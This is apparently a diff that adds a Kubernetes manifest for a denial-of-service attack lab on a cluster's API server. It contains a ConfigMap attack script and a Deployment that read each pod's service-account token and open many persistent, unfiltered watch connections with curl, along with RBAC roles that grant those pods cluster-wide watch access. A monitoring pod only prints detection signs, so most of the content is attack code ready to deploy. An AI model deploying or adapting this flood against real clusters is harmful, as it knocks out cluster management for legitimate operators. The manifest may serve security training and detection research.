@@ -1,0 +1,235 @@
+apiVersion: v1
+kind: Namespace
+metadata:
+  name: api-dos-attack
+---
+# DoS Attack #1: API Server Watch Request Flooding
+# Description: Overwhelm API server with massive volume of watch requests
+# causing connection exhaustion and denial of service.
+#
+# Attack Flow:
+# 1. Compromise: Pod with kubectl access or service account token
+# 2. Target: API server connection pool (typically limited to 500-1000 connections)
+# 3. Flood: Spawn many watches with no filters (watch ALL resources)
+# 4. Exhaust: Connection pool fills, legitimate requests timeout
+# 5. Crash: API server becomes unresponsive
+# 6. Impact: Cluster cannot be managed, pods can't be scheduled
+#
+# Watch API Details:
+# - Each watch opens persistent connection to API server
+# - Server maintains connection until client disconnects
+# - No filter = server must send ALL resource changes
+# - Each watch consumes server memory and connection slot
+#
+# Attack Variations:
+# - Watch pods in all namespaces with no field/label selectors
+# - Watch events (high volume updates)
+# - Watch with high frequency updates (triggering server load)
+# - Concurrent watches from many pods
+#
+# Detection Points:
+# - Spike in API server connections
+# - High number of watch requests from single pod
+# - API server CPU/memory spike
+# - Request latency increase
+# - Connection timeout errors from legitimate clients
+# - Repeated watch endpointss from same source
+
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: api-dos-guide
+  namespace: api-dos-attack
+data:
+  attack-script: |
+    #!/bin/bash
+    # API Server Watch Flooding Attack
+    
+    TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+    CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+    NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
+    API="https://kubernetes.default"
+    
+    echo "[*] Starting API Watch Flood Attack"
+    echo "[*] Token: $(echo -n $TOKEN | wc -c) bytes"
+    echo "[*] Namespace: $NAMESPACE"
+    
+    # Start many watch connections
+    for i in {1..100}; do
+      echo "[*] Starting watch connection $i..."
+      
+      # Watch with no filtering - sends ALL pod updates
+      curl -s -H "Authorization: Bearer $TOKEN" \
+        --cacert $CA \
+        "$API:443/api/v1/watch/pods?timeoutSeconds=10000" \
+        2>/dev/null | while read line; do
+          # Just consume the stream
+          echo "[WATCH] $i: $line" >> /tmp/watch.log
+        done &
+      
+      # For even more impact:
+      # curl "$API:443/api/v1/watch/events?timeoutSeconds=10000" &
+      # curl "$API:443/api/v1/watch/configmaps?timeoutSeconds=10000" &
+    done
+    
+    echo "[*] All watch connections started"
+    echo "[*] API server should be experiencing connection exhaustion"
+    
+    wait
+
+---
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: api-flooder
+  namespace: api-dos-attack
+  labels:
+    app: flooder
+spec:
+  replicas: 5  # Scale to increase impact
+  selector:
+    matchLabels:
+      app: flooder
+  template:
+    metadata:
+      labels:
+        app: flooder
+    spec:
+      serviceAccountName: flooder-sa
+      containers:
+      - name: flooder
+        image: curlimages/curl:latest
+        command:
+        - sh
+        - -c
+        - |
+          echo "[*] API Server DoS Attacker (pod $(hostname))"
+          
+          TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+          CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+          API="https://kubernetes.default"
+          
+          echo "[*] Attempting to flood API server watch endpoint"
+          
+          # Start watch connections continuously
+          for i in {1..50}; do
+            echo "[*] Opening watch connection $i from $(hostname)..."
+            
+            # Each watch keeps persistent connection open
+            curl -s -H "Authorization: Bearer $TOKEN" \
+              --cacert $CA \
+              "$API:443/api/v1/watch/pods?timeoutSeconds=36000" \
+              2>/dev/null &
+          done
+          
+          echo "[+] All watch connections established"
+          echo "[+] API Server connections consuming resources..."
+          
+          # Keep process alive
+          sleep 36000
+
+---
+apiVersion: v1
+kind: ServiceAccount
+metadata:
+  name: flooder-sa
+  namespace: api-dos-attack
+
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRole
+metadata:
+  name: watch-role
+rules:
+- apiGroups: [""]
+  resources: ["pods", "services", "events"]
+  verbs: ["get", "list", "watch"]
+- apiGroups: ["apps"]
+  resources: ["deployments"]
+  verbs: ["get", "list", "watch"]
+
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRoleBinding
+metadata:
+  name: watch-binding
+roleRef:
+  apiGroup: rbac.authorization.k8s.io
+  kind: ClusterRole
+  name: watch-role
+subjects:
+- kind: ServiceAccount
+  name: flooder-sa
+  namespace: api-dos-attack
+
+---
+# Monitoring API Server Health
+apiVersion: v1
+kind: Pod
+metadata:
+  name: api-health-monitor
+  namespace: api-dos-attack
+  labels:
+    tool: monitor
+spec:
+  serviceAccountName: monitor-sa
+  containers:
+  - name: monitor
+    image: curlimages/curl:latest
+    command:
+    - sh
+    - -c
+    - |
+      echo "=== API Server DoS Detection ==="
+      
+      echo "[*] Checking API server health..."
+      
+      echo "[*] Red flags for API DoS:"
+      echo "  • API server latency spike (should be <100ms)"
+      echo "  • Increased number of connections to :6443"
+      echo "  • High CPU/memory usage in kube-apiserver"
+      echo "  • Timeouts on kubectl commands"
+      echo "  • watch/pods requests from pods (unusual)"
+      echo "  • Same source IP with 100+ concurrent connections"
+      
+      echo ""
+      echo "[*] Would collect metrics from:"
+      echo "  kubectl top node"
+      echo "  kubectl top pods -n kube-system"
+      echo "  kubectl get events -n kube-system"
+      
+      sleep 3600
+
+---
+apiVersion: v1
+kind: ServiceAccount
+metadata:
+  name: monitor-sa
+  namespace: api-dos-attack
+
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRole
+metadata:
+  name: api-monitor
+rules:
+- apiGroups: [""]
+  resources: ["events"]
+  verbs: ["get", "list"]
+- apiGroups: [""]
+  resources: ["nodes"]
+  verbs: ["get", "list"]
+
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRoleBinding
+metadata:
+  name: api-monitor-binding
+roleRef:
+  apiGroup: rbac.authorization.k8s.io
+  kind: ClusterRole
+  name: api-monitor
+subjects:
+- kind: ServiceAccount
+  name: monitor-sa
+  namespace: api-dos-attack
